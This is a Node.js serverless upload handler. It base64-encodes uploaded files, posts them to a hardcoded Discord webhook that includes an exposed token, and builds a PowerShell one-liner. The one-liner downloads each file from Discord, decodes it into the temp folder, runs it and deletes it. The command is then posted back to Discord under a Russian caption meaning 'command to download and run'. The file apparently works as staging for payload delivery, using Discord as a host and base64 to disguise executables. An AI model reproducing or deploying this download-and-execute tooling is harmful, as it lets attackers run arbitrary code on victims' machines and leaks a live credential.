const https = require('https');

const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1504857329190048006/VKZEEClNQkY75JLhBYc91V5fr8buY5A-O8fgnJFtDVnHVwCc9Fro54FI9ZJrGSpssVh2';

function parseMultipart(data, boundary) {
    const parts = [];
    const boundaryBuffer = Buffer.from('--' + boundary);
    const endBoundaryBuffer = Buffer.from('--' + boundary + '--');
    let start = 0;
    
    while (true) {
        const boundaryIndex = data.indexOf(boundaryBuffer, start);
        if (boundaryIndex === -1) break;
        
        const isEndBoundary = data.indexOf(endBoundaryBuffer, start) === boundaryIndex;
        const nextBoundaryIndex = data.indexOf(boundaryBuffer, boundaryIndex + boundaryBuffer.length);
        
        if (nextBoundaryIndex === -1 && !isEndBoundary) break;
        
        const endIndex = nextBoundaryIndex !== -1 ? nextBoundaryIndex : boundaryIndex + (isEndBoundary ? endBoundaryBuffer.length : boundaryBuffer.length);
        const part = data.slice(boundaryIndex + boundaryBuffer.length, endIndex);
        
        let contentStart = 0;
        if (part.slice(0, 2).toString() === '\r\n') contentStart = 2;
        
        const headerEnd = part.indexOf('\r\n\r\n', contentStart);
        if (headerEnd !== -1) {
            const headers = part.slice(contentStart, headerEnd).toString();
            let content = part.slice(headerEnd + 4);
            if (content.slice(-2).toString() === '\r\n') content = content.slice(0, -2);
            
            const nameMatch = headers.match(/name="([^"]+)"/);
            const filenameMatch = headers.match(/filename="([^"]+)"/);
            
            if (nameMatch) {
                parts.push({ name: nameMatch[1], filename: filenameMatch ? filenameMatch[1] : null, content });
            }
        }
        
        if (isEndBoundary || nextBoundaryIndex === -1) break;
        start = nextBoundaryIndex;
    }
    return parts;
}

function sendDiscordMessage(content) {
    return new Promise((resolve, reject) => {
        const webhookUrl = new URL(DISCORD_WEBHOOK);
        const data = JSON.stringify({ content });
        
        const discordReq = https.request({
            hostname: webhookUrl.hostname,
            path: webhookUrl.pathname,
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Content-Length': data.length }
        }, discordRes => {
            let responseData = '';
            discordRes.on('data', chunk => responseData += chunk);
            discordRes.on('end', () => resolve(responseData));
        });
        
        discordReq.on('error', err => reject(err));
        discordReq.write(data);
        discordReq.end();
    });
}

function uploadFileToDiscord(filePart) {
    return new Promise((resolve, reject) => {
        const base64Content = filePart.content.toString('base64');
        const encodedFilename = filePart.filename.replace(/\.[^/.]+$/, '') + '.b64';
        const boundary = '----DiscordBoundary' + Date.now();
        
        const discordData = [
            `--${boundary}\r\n`,
            `Content-Disposition: form-data; name="file"; filename="${encodedFilename}"\r\n`,
            `Content-Type: text/plain\r\n\r\n`,
        ];
        
        const body = Buffer.concat([
            Buffer.from(discordData.join('')),
            Buffer.from(base64Content),
            Buffer.from(`\r\n--${boundary}--\r\n`)
        ]);
        
        const webhookUrl = new URL(DISCORD_WEBHOOK);
        const discordReq = https.request({
            hostname: webhookUrl.hostname,
            path: webhookUrl.pathname,
            method: 'POST',
            headers: {
                'Content-Type': `multipart/form-data; boundary=${boundary}`,
                'Content-Length': body.length
            }
        }, discordRes => {
            let data = '';
            discordRes.on('data', chunk => data += chunk);
            discordRes.on('end', () => {
                try {
                    const json = JSON.parse(data);
                    if (json.attachments?.[0]?.url) {
                        resolve({
                            fileUrl: json.attachments[0].url,
                            originalName: filePart.filename
                        });
                    } else {
                        reject(new Error('No attachment in Discord response'));
                    }
                } catch (e) {
                    reject(e);
                }
            });
        });
        
        discordReq.on('error', reject);
        discordReq.write(body);
        discordReq.end();
    });
}

module.exports = async (req, res) => {
    // Enable CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        console.log('Upload started...');
        const contentType = req.headers['content-type'] || '';
        console.log('Content-Type:', contentType);

        if (!contentType.includes('multipart/form-data')) {
            return res.status(400).json({ success: false, error: 'Invalid content type: ' + contentType });
        }

        let boundary = contentType.split('boundary=')[1];
        if (boundary) {
            boundary = boundary.split(';')[0].replace(/^["']|["']$/g, '').trim();
        } else {
            return res.status(400).json({ success: false, error: 'No boundary found' });
        }

        console.log('Boundary:', boundary);

        // Collect body data
        const chunks = [];
        try {
            for await (const chunk of req) {
                chunks.push(chunk);
            }
        } catch (e) {
            console.error('Error reading request body:', e);
            return res.status(500).json({ success: false, error: 'Failed to read request body: ' + e.message });
        }
        
        const buffer = Buffer.concat(chunks);
        console.log('Total buffer size:', buffer.length);

        if (buffer.length === 0) {
            return res.status(400).json({ success: false, error: 'Empty body' });
        }

        const parts = parseMultipart(buffer, boundary);
        console.log('Parsed parts count:', parts.length);
        
        const fileParts = parts.filter(p => p.name === 'fileToUpload' && p.filename);
        console.log('File parts found:', fileParts.length);

        if (fileParts.length === 0) {
            return res.status(400).json({ success: false, error: 'No files found in parts. Parts keys: ' + parts.map(p => p.name).join(', ') });
        }

        // Upload all files
        const uploadResults = [];
        for (const filePart of fileParts) {
            console.log('Uploading file to Discord:', filePart.filename);
            const result = await uploadFileToDiscord(filePart);
            uploadResults.push(result);
        }

        // Generate combined command
        let combinedCmd = '';
        if (uploadResults.length === 1) {
            const r = uploadResults[0];
            combinedCmd = `powershell -c "$t=\\"$env:TEMP\\${r.originalName}\\";$u='${r.fileUrl}';[IO.File]::WriteAllBytes($t,[Convert]::FromBase64String((irm $u)));Start-Process $t -Wait;Remove-Item $t"`;
        } else {
            let cmdParts = [];
            let varDefs = [];
            let startParts = [];
            
            uploadResults.forEach((r, i) => {
                const idx = i + 1;
                varDefs.push(`$t${idx}=\\"$env:TEMP\\${r.originalName}\\"`);
                varDefs.push(`$u${idx}='${r.fileUrl}'`);
                cmdParts.push(`[IO.File]::WriteAllBytes($t${idx},[Convert]::FromBase64String((irm $u${idx})))`);
                startParts.push(`Start-Process $t${idx} -Wait`);
            });
            
            const removeParts = uploadResults.map((_, i) => `$t${i+1}`).join(',');
            combinedCmd = `powershell -c "${varDefs.join(';')};${cmdParts.join(';')};${startParts.join(';')};Remove-Item ${removeParts}"`;
        }

        const fileNames = uploadResults.map(r => r.originalName).join(', ');
        const finalMsg = `📁 **${fileNames}**\n\nКоманда для скачивания и запуска:\n\`\`\`powershell\n${combinedCmd}\n\`\`\``;
        
        console.log('Sending message to Discord...');
        await sendDiscordMessage(finalMsg);
        console.log('Upload successful!');

        return res.status(200).json({
            success: true,
            files: uploadResults,
            command: combinedCmd
        });

    } catch (error) {
        console.error('Fatal API Error:', error);
        return res.status(500).json({ success: false, error: 'Server Internal Error: ' + error.message });
    }
};
